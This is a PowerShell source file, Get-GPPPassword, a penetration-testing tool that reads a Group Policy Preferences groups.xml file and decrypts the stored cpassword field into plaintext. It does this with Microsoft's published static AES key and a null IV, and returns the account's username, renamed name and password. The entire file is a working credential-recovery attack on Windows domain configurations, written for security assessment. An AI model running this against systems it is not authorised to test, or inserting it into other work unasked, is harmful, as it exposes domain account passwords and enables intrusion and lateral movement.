function Get-GPPPassword {

<#
.Synopsis

 Get-GPPPassword retrieves the plaintext password for accounts pushed through Group Policy in groups.xml.
 Author: Chris Campbell (@obscuresec)
 License: BSD 3-Clause
 
.Description

 Get-GPPPassword imports the encoded and encrypted password string from groups.xml and then decodes and decrypts the plaintext password.

.Parameter Path

 The path to the targeted groups.xml file.

.Example

 Get-GPPPassword -path c:\demo\groups.xml

.Link

 http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
 http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html
#>

Param ( [Parameter(Position = 0, Mandatory = $True)] [String] $Path = "$PWD\groups.xml" )

    #Function to pull encrypted password string from groups.xml
    function Parse-cPassword {
    
        try {
            [xml] $Xml = Get-Content ($Path)
            [String] $Cpassword = $Xml.Groups.User.Properties.cpassword
        } catch { Write-Error "No Password Policy Found in File!" } 
         
        return $Cpassword
    }
    
    #Function to look to see if the administrator account is given a newname
    function Parse-NewName {
    
        [xml] $Xml = Get-Content ($Path) 
        [String] $NewName = $Xml.Groups.User.Properties.newName
        
        return $NewName
    }
    
    #Function to parse out the Username whose password is being specified
    function Parse-UserName {
    
        try {
            [xml] $Xml = Get-Content ($Path) 
            [string] $UserName = $Xml.Groups.User.Properties.userName 
        } catch { Write-Error "No Username Specified in File!" }
        
        return $UserName
    }
    
    #Function that decodes and decrypts password
    function Decrypt-Password {
    
        try {
            #Append appropriate padding based on string length  
            $Pad = "=" * (4 - ($Cpassword.length % 4))
            $Base64Decoded = [Convert]::FromBase64String($Cpassword + $Pad)
            #Create a new AES .NET Crypto Object
            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            #Static Key from http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
            [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            #Set IV to all nulls (thanks Matt) to prevent dynamic generation of IV value
            $AesIV = New-Object Byte[]($AesObject.IV.Length) 
            $AesObject.IV = $AesIV
            $AesObject.Key = $AesKey
            $DecryptorObject = $AesObject.CreateDecryptor() 
            [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
            
            return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
        } catch { Write-Error "Decryption Failed!" }
     
    }

    $Cpassword = Parse-cPassword 
    $Password = Decrypt-Password
    $NewName = Parse-NewName
    $UserName = Parse-UserName
    
    $Results = New-Object System.Object
    
    Add-Member -InputObject $Results -type NoteProperty -name UserName -value $UserName
    Add-Member -InputObject $Results -type NoteProperty -name NewName -value $NewName
    Add-Member -InputObject $Results -type NoteProperty -name Password -value $Password

    return $Results
 
}
